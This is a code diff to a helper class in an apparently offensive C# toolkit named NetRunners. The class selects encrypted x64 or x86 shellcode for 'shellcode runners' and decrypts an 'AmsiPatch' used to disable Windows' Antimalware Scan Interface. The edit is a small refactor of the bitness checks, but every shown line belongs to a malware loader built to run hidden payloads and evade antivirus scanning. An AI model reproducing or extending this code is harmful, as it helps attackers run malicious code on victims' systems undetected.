@@ -1,4 +1,5 @@
-﻿using static NetRunners.Data.EncryptedData;
+﻿using System;
+using static NetRunners.Data.EncryptedData;
 using static NetRunners.Decryptors.AesDecryptor;
 
 namespace NetRunners.Helpers
@@ -8,13 +9,13 @@ namespace NetRunners.Helpers
         public static (byte[] buf, int sBuf) GetPayloadAndSize()  // for shellcode runners
         {
             // define buf var using bitness
-            byte[] buf = (System.Environment.Is64BitProcess) ?
-                Data.EncryptedData.buf :                               // x64 payload
-                Data.EncryptedData.buf86;                               // x86 payload
+            byte[] buf = (IntPtr.Size == 8) 
+                ? Data.EncryptedData.buf                                // x64 payload
+                : Data.EncryptedData.buf86;                             // x86 payload
             // define sbuf var using bitness
-            int sBuf = (System.Environment.Is64BitProcess) ?
-                Data.EncryptedData.sBuf :                               // x64 payload
-                Data.EncryptedData.sBuf86;                              // x86 payload
+            int sBuf = (IntPtr.Size == 8)
+                ? Data.EncryptedData.sBuf                               // x64 payload
+                : Data.EncryptedData.sBuf86;                              // x86 payload
 
             return (buf, sBuf);                                         // returns tuple with buf and sBuf
         }
@@ -23,7 +24,7 @@ namespace NetRunners.Helpers
             byte[] patch;
 
             // retrieve correct patch
-            patch = (System.Environment.Is64BitProcess) 
+            patch = (IntPtr.Size == 8)
                 ? DecryptBytesToBytesAes(AmsiPatch, AesKey)             // x64 payload
                 : DecryptBytesToBytesAes(AmsiPatch86, AesKey);          // x86 payload
 
